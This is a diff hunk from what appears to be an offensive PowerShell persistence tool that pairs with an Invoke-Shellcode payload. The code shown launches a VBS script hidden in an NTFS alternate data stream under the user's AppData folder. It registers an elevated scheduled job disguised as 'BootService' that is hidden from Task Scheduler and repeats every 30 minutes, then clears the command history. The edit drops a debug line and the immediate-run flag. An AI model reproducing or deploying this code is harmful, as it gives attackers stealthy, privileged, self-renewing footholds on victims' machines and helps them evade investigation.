@@ -95,11 +95,10 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     }
     else {
        $script = "wscript.exe $env:USERPROFILE\AppData:$vbsFile"
-       "the `$Script path is {$Filepath}"
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $scriptblock = [scriptblock]::Create($script)
-       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option -RunNow
+       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option
        "Process Complete. Persistent schtask is created and will be triggered on every 30 mins."
        Clear-History
     }
